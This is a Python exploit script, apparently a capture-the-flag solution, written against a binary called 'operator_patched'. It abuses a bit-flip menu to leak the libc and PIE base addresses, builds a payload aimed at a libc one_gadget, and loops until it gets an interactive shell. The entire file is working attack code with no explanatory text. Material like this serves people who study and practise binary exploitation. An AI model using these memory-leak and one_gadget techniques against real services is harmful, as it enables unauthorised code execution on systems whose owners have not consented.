#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

# context.log_level = 'debug'
context.terminal = [
    "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
    "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
]
exe = context.binary = ELF('./operator_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
brva 0x14D3
brva 0x142A
brva 0x1469
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)

def flip(offset, bit):
    sla(b'>> ', b'2')
    slna(b'offset: ', offset)
    slna(b': ', bit)

def flip2(offset, payload):
    sla(b'>> ', b'2')
    slna(b'offset: ', offset)
    sla(b': ', payload)

# ==================== EXPLOIT ====================
while True:
    p = start()

    # Leak LIBC base
    flip(offset=48, bit=6)
    ru(b'after byte: ffffff83\n')
    libc.address = u64(rb(12).ljust(8, b'\0')) - 0x620d0
    success('libc base @ %#x', libc.address)

    # Leak PIE
    sl(b'1')
    sa(b'>> ', b'A' * 0x1000)

    sl(b'1')
    ru(b'A' * 0x1000)
    exe.address = u64(rl().strip().ljust(8, b'\0')) - 0x2008
    bss = exe.address + 0x4000
    success('pie base @ %#x', exe.address)
    info('bss @ %#x', bss)

    # One gadget offsets
    one_gadgets = [
        0xebcf1,
        0xebcf5,
        0xebcf8,
        0xebd52,
        0xebda8,
        0xebdaf,
        0xebdb3
    ]

    # print("[+] One-Gadget Addresses:")
    # for offset in one_gadgets:
    #     print(" - %#x" % (libc.address + offset))

    # Convert bss address to byte array
    bss_list = [(bss >> (8 * i)) & 0xFF for i in range(5, -1, -1)]
    byte_5, byte_4, byte_3, byte_2, byte_1, byte_0 = bss_list

    print(hex(byte_5))
    print(hex(byte_4))
    print(hex(byte_3))
    print(hex(byte_2))
    print(hex(byte_1))
    print(hex(byte_0))


    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        pause()

    # Final payload using one_gadget
    sl(b'1')

    oneshot = libc.address + one_gadgets[1]
    payload = (
        b"\x37\x0a" +
        bytes([byte_2, byte_3, byte_4, byte_5]) +
        b"\x00\x00" +
        p64(oneshot)
    )

    flip2(offset=40, payload=payload)

    try:
        sl(b'echo WIN')
        ru(b'WIN')
        interactive()
        break
    except:
        p.close()
